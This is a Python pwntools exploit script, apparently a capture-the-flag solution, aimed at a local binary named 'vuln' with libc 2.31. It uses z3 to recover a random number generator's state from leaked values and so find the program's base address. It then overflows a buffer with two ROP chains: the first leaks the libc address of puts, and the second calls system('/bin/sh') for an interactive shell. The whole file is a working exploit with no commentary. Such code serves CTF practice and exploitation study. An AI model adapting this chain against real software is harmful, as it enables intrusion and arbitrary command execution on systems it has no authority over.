# coding: utf-8
from pwn import *
import z3

context.binary = elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")
p = process("./vuln")

s = z3.Solver()
a = z3.BitVec('a', 32)
b = z3.BitVec('b', 32)
orig_a, orig_b = (a, b)

for i in range(5):
    p.sendlineafter(b"here: ", b"2")
    p.recvuntil(b"number is: ")
    leak = int(p.recvline().strip(), 16)
    a ^= 14 * a
    a ^= b
    b = 62555385 * b + 17
    s.add(a == leak)

s.check()
m = s.model()
a = m[orig_a].as_long()
b = m[orig_b].as_long()
menu = (a << 32) | b

elf.address = menu - elf.sym.main + 230

log.success(f"addr of menu @ {hex(menu)}")
log.success(f"addr of elf @ {hex(elf.address)}")

gdb.attach(p)

# stage 1 payload: leak LIBC address
r = ROP(elf)
r.puts(elf.got.puts)
r.main()

p.sendlineafter(b"here: ", b"3")
p.sendline(b"A" * 0x28 + r.chain())
p.sendlineafter(b"here: ", b"4")

libc_leak = unpack(p.recvline().strip(b'\n'), 'all')
libc.address = libc_leak - libc.sym.puts

log.success(f"addr of puts @ {hex(libc_leak)}")
log.success(f"addr of libc @ {hex(libc.address)}")

# stage 2 payload: call system('/bin/sh')
r = ROP(libc)
r.call(r.ret)
r.system(next(libc.search(b'/bin/sh')))

p.sendlineafter(b"here: ", b"3")
p.sendline(b"A" * 0x28 + r.chain())
p.sendlineafter(b"here: ", b"4")

p.interactive()
